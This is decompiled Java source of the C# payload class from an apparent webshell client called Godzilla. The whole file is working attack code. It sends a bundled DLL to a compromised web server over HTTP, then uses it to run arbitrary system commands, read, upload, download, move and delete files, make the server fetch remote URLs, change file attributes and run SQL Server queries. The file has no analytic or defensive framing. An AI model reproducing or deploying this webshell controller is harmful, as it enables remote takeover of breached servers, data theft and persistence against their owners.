/*     */ package shells.payloads.csharp;
/*     */ 
/*     */ import core.Encoding;
/*     */ import core.annotation.PayloadAnnotation;
/*     */ import core.imp.Payload;
/*     */ import core.shell.ShellEntity;
/*     */ import java.io.InputStream;
/*     */ import java.util.Map;
/*     */ import util.Log;
/*     */ import util.functions;
/*     */ import util.http.Http;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ @PayloadAnnotation(Name = "CShapDynamicPayload")
/*     */ public class CShapShell
/*     */   implements Payload {
/*     */   private static final String BASICINFO_REGEX = "(FileRoot|CurrentDir|OsInfo|CurrentUser|ProcessArch|TempDirectory) : (.+)";
/*  18 */   private static final String[] ALL_DATABASE_TYPE = new String[] { "sqlserver" };
/*     */   
/*     */   private ShellEntity shell;
/*     */   private Http http;
/*     */   private Encoding encoding;
/*     */   private String fileRoot;
/*     */   private String currentDir;
/*     */   private String currentUser;
/*     */   private String osInfo;
/*     */   private String basicsInfo;
/*     */   private String processArch;
/*     */   private String tempDirectory;
/*     */   private boolean isAlive;
/*     */   
/*     */   public void init(ShellEntity shellContext) {
/*  33 */     this.shell = shellContext;
/*  34 */     this.http = this.shell.getHttp();
/*  35 */     this.encoding = Encoding.getEncoding(this.shell);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public String getFile(String filePath) {
/*  41 */     ReqParameter parameters = new ReqParameter();
/*  42 */     parameters.add("dirName", this.encoding.Encoding((filePath.length() > 0) ? filePath : " "));
/*  43 */     return this.encoding.Decoding(evalFunc(null, "getFile", parameters));
/*     */   }
/*     */ 
/*     */   
/*     */   public byte[] downloadFile(String fileName) {
/*  48 */     ReqParameter parameter = new ReqParameter();
/*  49 */     parameter.add("fileName", this.encoding.Encoding(fileName));
/*  50 */     byte[] result = evalFunc(null, "readFile", parameter);
/*  51 */     return result;
/*     */   }
/*     */ 
/*     */   
/*     */   public String getBasicsInfo() {
/*  56 */     if (this.basicsInfo == null) {
/*  57 */       ReqParameter parameter = new ReqParameter();
/*  58 */       this.basicsInfo = this.encoding.Decoding(evalFunc(null, "getBasicsInfo", parameter));
/*     */     } 
/*  60 */     Map<String, String> pxMap = functions.matcherTwoChild(this.basicsInfo, "(FileRoot|CurrentDir|OsInfo|CurrentUser|ProcessArch|TempDirectory) : (.+)");
/*  61 */     this.fileRoot = pxMap.get("FileRoot");
/*  62 */     this.currentDir = pxMap.get("CurrentDir");
/*  63 */     this.currentUser = pxMap.get("CurrentUser");
/*  64 */     this.osInfo = pxMap.get("OsInfo");
/*  65 */     this.processArch = pxMap.get("ProcessArch");
/*  66 */     this.tempDirectory = pxMap.get("TempDirectory");
/*  67 */     return this.basicsInfo;
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean include(String codeName, byte[] binCode) {
/*  72 */     ReqParameter parameters = new ReqParameter();
/*  73 */     parameters.add("codeName", codeName);
/*  74 */     parameters.add("binCode", binCode);
/*  75 */     byte[] result = evalFunc(null, "include", parameters);
/*  76 */     String resultString = (new String(result)).trim();
/*  77 */     if (resultString.equals("ok")) {
/*  78 */       return true;
/*     */     }
/*  80 */     Log.error(resultString);
/*  81 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public void fillParameter(String className, String funcName, ReqParameter parameter) {
/*  87 */     if (className != null && className.trim().length() > 0) {
/*  88 */       parameter.add("evalClassName", className);
/*     */     }
/*  90 */     parameter.add("methodName", funcName);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] evalFunc(String className, String funcName, ReqParameter parameter) {
/*  96 */     fillParameter(className, funcName, parameter);
/*  97 */     byte[] data = parameter.formatEx();
/*     */     
/*  99 */     data = functions.gzipE(data);
/*     */ 
/*     */     
/* 102 */     return functions.gzipD(this.http.sendHttpResponse(data).getResult());
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean uploadFile(String fileName, byte[] data) {
/* 108 */     ReqParameter parameter = new ReqParameter();
/* 109 */     parameter.add("fileName", this.encoding.Encoding(fileName));
/* 110 */     parameter.add("fileValue", data);
/* 111 */     byte[] result = evalFunc(null, "uploadFile", parameter);
/* 112 */     String stateString = this.encoding.Decoding(result);
/* 113 */     if ("ok".equals(stateString)) {
/* 114 */       return true;
/*     */     }
/* 116 */     Log.error(stateString);
/* 117 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean copyFile(String fileName, String newFile) {
/* 123 */     ReqParameter parameter = new ReqParameter();
/* 124 */     parameter.add("srcFileName", this.encoding.Encoding(fileName));
/* 125 */     parameter.add("destFileName", this.encoding.Encoding(newFile));
/* 126 */     byte[] result = evalFunc(null, "copyFile", parameter);
/* 127 */     String stateString = this.encoding.Decoding(result);
/* 128 */     if ("ok".equals(stateString)) {
/* 129 */       return true;
/*     */     }
/* 131 */     Log.error(stateString);
/* 132 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean deleteFile(String fileName) {
/* 138 */     ReqParameter parameter = new ReqParameter();
/* 139 */     parameter.add("fileName", this.encoding.Encoding(fileName));
/* 140 */     byte[] result = evalFunc(null, "deleteFile", parameter);
/* 141 */     String stateString = this.encoding.Decoding(result);
/* 142 */     if ("ok".equals(stateString)) {
/* 143 */       return true;
/*     */     }
/* 145 */     Log.error(stateString);
/* 146 */     return false;
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean newFile(String fileName) {
/* 151 */     ReqParameter parameter = new ReqParameter();
/* 152 */     parameter.add("fileName", this.encoding.Encoding(fileName));
/* 153 */     byte[] result = evalFunc(null, "newFile", parameter);
/* 154 */     String stateString = this.encoding.Decoding(result);
/* 155 */     if ("ok".equals(stateString)) {
/* 156 */       return true;
/*     */     }
/* 158 */     Log.error(stateString);
/* 159 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean newDir(String fileName) {
/* 165 */     ReqParameter parameter = new ReqParameter();
/* 166 */     parameter.add("dirName", this.encoding.Encoding(fileName));
/* 167 */     byte[] result = evalFunc(null, "newDir", parameter);
/* 168 */     String stateString = this.encoding.Decoding(result);
/* 169 */     if ("ok".equals(stateString)) {
/* 170 */       return true;
/*     */     }
/* 172 */     Log.error(stateString);
/* 173 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public String execSql(String dbType, String dbHost, int dbPort, String dbUsername, String dbPassword, String execType, Map options, String execSql) {
/* 180 */     ReqParameter parameter = new ReqParameter();
/* 181 */     parameter.add("dbType", dbType);
/* 182 */     parameter.add("dbHost", dbHost);
/* 183 */     parameter.add("dbPort", Integer.toString(dbPort));
/* 184 */     parameter.add("dbUsername", dbUsername);
/* 185 */     parameter.add("dbPassword", dbPassword);
/* 186 */     parameter.add("execType", execType);
/* 187 */     parameter.add("execSql", this.shell.getDbEncodingModule().Encoding(execSql));
/* 188 */     if (options != null) {
/* 189 */       String dbCharset = (String)options.get("dbCharset");
/* 190 */       String currentDb = (String)options.get("currentDb");
/* 191 */       if (dbCharset != null) {
/* 192 */         parameter.add("dbCharset", dbCharset);
/* 193 */         parameter.add("execSql", Encoding.getEncoding(dbCharset).Encoding(execSql));
/*     */       } 
/* 195 */       if (currentDb != null) {
/* 196 */         parameter.add("currentDb", currentDb);
/*     */       }
/*     */     } 
/* 199 */     byte[] result = evalFunc(null, "execSql", parameter);
/* 200 */     return this.encoding.Decoding(result);
/*     */   }
/*     */ 
/*     */   
/*     */   public String currentDir() {
/* 205 */     if (this.currentDir != null) {
/* 206 */       return functions.formatDir(this.currentDir);
/*     */     }
/* 208 */     getBasicsInfo();
/* 209 */     return functions.formatDir(this.currentDir);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean test() {
/* 215 */     ReqParameter parameter = new ReqParameter();
/* 216 */     byte[] result = evalFunc(null, "test", parameter);
/* 217 */     String codeString = new String(result);
/* 218 */     if (codeString.trim().equals("ok")) {
/* 219 */       this.isAlive = true;
/* 220 */       return true;
/*     */     } 
/* 222 */     Log.error(codeString);
/* 223 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public String currentUserName() {
/* 229 */     if (this.currentUser != null) {
/* 230 */       return this.currentUser;
/*     */     }
/* 232 */     getBasicsInfo();
/* 233 */     return this.currentUser;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public String bigFileUpload(String fileName, int position, byte[] content) {
/* 239 */     ReqParameter reqParameter = new ReqParameter();
/* 240 */     reqParameter.add("fileContents", content);
/* 241 */     reqParameter.add("fileName", this.encoding.Encoding(fileName));
/* 242 */     reqParameter.add("position", String.valueOf(position));
/* 243 */     byte[] result = evalFunc(null, "bigFileUpload", reqParameter);
/* 244 */     return this.encoding.Decoding(result);
/*     */   }
/*     */ 
/*     */   
/*     */   public String getTempDirectory() {
/* 249 */     if (this.tempDirectory != null) {
/* 250 */       return this.tempDirectory;
/*     */     }
/* 252 */     if (isWindows()) {
/* 253 */       return "c:/windows/temp/";
/*     */     }
/* 255 */     return "/tmp/";
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] bigFileDownload(String fileName, int position, int readByteNum) {
/* 262 */     ReqParameter reqParameter = new ReqParameter();
/* 263 */     reqParameter.add("position", String.valueOf(position));
/* 264 */     reqParameter.add("readByteNum", String.valueOf(readByteNum));
/* 265 */     reqParameter.add("fileName", this.encoding.Encoding(fileName));
/* 266 */     reqParameter.add("mode", "read");
/* 267 */     return evalFunc(null, "bigFileDownload", reqParameter);
/*     */   }
/*     */ 
/*     */   
/*     */   public int getFileSize(String fileName) {
/* 272 */     ReqParameter reqParameter = new ReqParameter();
/* 273 */     reqParameter.add("fileName", this.encoding.Encoding(fileName));
/* 274 */     reqParameter.add("mode", "fileSize");
/* 275 */     byte[] result = evalFunc(null, "bigFileDownload", reqParameter);
/* 276 */     String ret = this.encoding.Decoding(result);
/*     */     try {
/* 278 */       return Integer.parseInt(ret);
/* 279 */     } catch (Exception e) {
/* 280 */       Log.error(e);
/* 281 */       Log.error(ret);
/*     */       
/* 283 */       return -1;
/*     */     } 
/*     */   }
/*     */   
/*     */   public boolean isWindows() {
/* 288 */     return (currentDir().charAt(0) != '/');
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean isAlive() {
/* 293 */     return this.isAlive;
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean isX64() {
/* 298 */     return this.processArch.contains("64");
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public String[] listFileRoot() {
/* 304 */     if (this.fileRoot != null) {
/* 305 */       return this.fileRoot.split(";");
/*     */     }
/* 307 */     getBasicsInfo();
/* 308 */     return this.fileRoot.split(";");
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public String execCommand(String commandStr) {
/* 314 */     ReqParameter parameter = new ReqParameter();
/* 315 */     parameter.add("cmdLine", this.encoding.Encoding(commandStr));
/*     */     
/* 317 */     String[] commandArgs = functions.SplitArgs(commandStr);
/* 318 */     for (int i = 0; i < commandArgs.length; i++) {
/* 319 */       parameter.add(String.format("arg-%d", new Object[] { Integer.valueOf(i) }), this.encoding.Encoding(commandArgs[i]));
/*     */     } 
/* 321 */     parameter.add("argsCount", String.valueOf(commandArgs.length));
/*     */     
/* 323 */     String[] executableArgs = functions.SplitArgs(commandStr, 1, false);
/*     */     
/* 325 */     if (executableArgs.length > 0) {
/* 326 */       parameter.add("executableFile", executableArgs[0]);
/* 327 */       if (executableArgs.length >= 2) {
/* 328 */         parameter.add("executableArgs", executableArgs[1]);
/*     */       }
/*     */     } 
/*     */ 
/*     */     
/* 333 */     byte[] result = evalFunc(null, "execCommand", parameter);
/* 334 */     return this.encoding.Decoding(result);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public String getOsInfo() {
/* 340 */     if (this.osInfo != null) {
/* 341 */       return this.osInfo;
/*     */     }
/* 343 */     getBasicsInfo();
/* 344 */     return this.osInfo;
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public String[] getAllDatabaseType() {
/* 351 */     return ALL_DATABASE_TYPE;
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean moveFile(String fileName, String newFile) {
/* 356 */     ReqParameter parameter = new ReqParameter();
/* 357 */     parameter.add("srcFileName", this.encoding.Encoding(fileName));
/* 358 */     parameter.add("destFileName", this.encoding.Encoding(newFile));
/* 359 */     byte[] result = evalFunc(null, "moveFile", parameter);
/* 360 */     String stasteString = this.encoding.Decoding(result);
/* 361 */     if ("ok".equals(stasteString)) {
/* 362 */       return true;
/*     */     }
/* 364 */     Log.error(stasteString);
/* 365 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] getPayload() {
/* 372 */     byte[] data = null;
/*     */     try {
/* 374 */       InputStream fileInputStream = CShapShell.class.getResourceAsStream("assets/payload.dll");
/* 375 */       data = functions.readInputStream(fileInputStream);
/* 376 */       fileInputStream.close();
/* 377 */     } catch (Exception e) {
/* 378 */       Log.error(e);
/*     */     } 
/* 380 */     return data;
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean fileRemoteDown(String url, String saveFile) {
/* 385 */     ReqParameter reqParameter = new ReqParameter();
/* 386 */     reqParameter.add("url", this.encoding.Encoding(url));
/* 387 */     reqParameter.add("saveFile", this.encoding.Encoding(saveFile));
/* 388 */     String result = this.encoding.Decoding(evalFunc(null, "fileRemoteDown", reqParameter));
/* 389 */     if ("ok".equals(result)) {
/* 390 */       return true;
/*     */     }
/* 392 */     Log.error(result);
/* 393 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean setFileAttr(String file, String type, String fileAttr) {
/* 399 */     ReqParameter reqParameter = new ReqParameter();
/* 400 */     reqParameter.add("type", type);
/* 401 */     reqParameter.add("fileName", this.encoding.Encoding(file));
/* 402 */     reqParameter.add("attr", fileAttr);
/* 403 */     String result = this.encoding.Decoding(evalFunc(null, "setFileAttr", reqParameter));
/* 404 */     if ("ok".equals(result)) {
/* 405 */       return true;
/*     */     }
/* 407 */     Log.error(result);
/* 408 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean close() {
/* 414 */     this.isAlive = false;
/* 415 */     ReqParameter reqParameter = new ReqParameter();
/* 416 */     String result = this.encoding.Decoding(evalFunc(null, "close", reqParameter));
/* 417 */     if ("ok".equals(result)) {
/* 418 */       return true;
/*     */     }
/* 420 */     Log.error(result);
/* 421 */     return false;
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\payloads\csharp\CShapShell.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */